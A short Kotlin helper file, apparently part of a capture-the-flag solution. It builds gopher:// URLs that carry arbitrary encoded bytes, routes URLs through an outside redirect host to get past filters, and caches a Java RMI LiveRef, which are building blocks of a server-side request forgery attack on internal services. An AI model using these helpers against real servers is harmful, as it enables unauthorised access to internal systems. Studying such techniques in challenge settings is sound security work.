package soln

import io.ktor.http.*
import io.ktor.util.*
import sun.rmi.transport.LiveRef
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.ObjectInputStream
import java.io.ObjectOutputStream

fun ByteArray.allUrlEncoded(): String = hex(this).chunked(2) { "%$it" }.joinToString("")

fun gopherUrl(host: String, port: Int, data: ByteArray): String = "gopher://$host:$port/_${data.allUrlEncoded()}"

fun redirectUrl(url: String): String = "https://hb.ceclin.top/redirect-to?${listOf("url" to url).formUrlEncode()}"

fun saveLiveRef(liveRef: LiveRef): Unit = ObjectOutputStream(FileOutputStream("live_ref.cache")).use {
    liveRef.write(it, false)
}

fun loadLiveRef(): LiveRef = ObjectInputStream(FileInputStream("live_ref.cache")).use {
    LiveRef.read(it, false)
}